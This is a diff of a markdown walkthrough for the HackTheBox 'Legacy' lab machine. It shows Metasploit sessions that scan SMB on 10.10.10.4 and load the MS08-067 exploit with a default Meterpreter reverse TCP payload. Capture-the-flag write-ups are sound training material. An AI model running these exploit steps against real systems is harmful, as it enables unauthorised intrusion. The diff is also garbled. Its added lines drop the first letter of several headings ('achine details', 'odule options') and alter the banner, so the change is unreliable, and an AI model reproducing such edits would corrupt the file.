@@ -1,14 +1,8 @@
----
-title: HackTheBox Legacy Walkthrough
-created: '2020-08-20T17:10:23.504Z'
-modified: '2020-08-22T14:47:53.466Z'
----
-
 # HackTheBox Legacy Walkthrough
 
 This is a Walkthrough how I get the user and root flag on the machine. All my scan results are stored in the [attachments](./attachments) folder.
 
-Machine details:
+achine details:
 
 - Machine Name : Legacy
 - IP address: 10.10.10.4
@@ -47,7 +41,7 @@ root@Kali:/# msfconsole
 .WMMMMMMMMM:                       :MMMMMMMMMM,
 xMMMMMMMMMo                         lMMMMMMMMMO
 NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
-MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+MMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
 NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
 xMMMMMMMMMd                        ,0MMMMMMMMMMK;
 .WMMMMMMMMMc                         'OMMMMMM0,
@@ -67,12 +61,12 @@ xMMMMMMMMMd                        ,0MMMMMMMMMMK;
 + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 7 evasion                                       ]
 
-Metasploit tip: Open an interactive Ruby terminal with irb
+etasploit tip: Open an interactive Ruby terminal with irb
 
 msf5 > use auxiliary/scanner/smb/smb_version
 msf5 auxiliary(scanner/smb/smb_version) > show options
 
-Module options (auxiliary/scanner/smb/smb_version):
+odule options (auxiliary/scanner/smb/smb_version):
 
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
@@ -104,7 +98,7 @@ msf5 auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms08_067_netap
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf5 exploit(windows/smb/ms08_067_netapi) > show options
 
-Module options (exploit/windows/smb/ms08_067_netapi):
+odule options (exploit/windows/smb/ms08_067_netapi):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
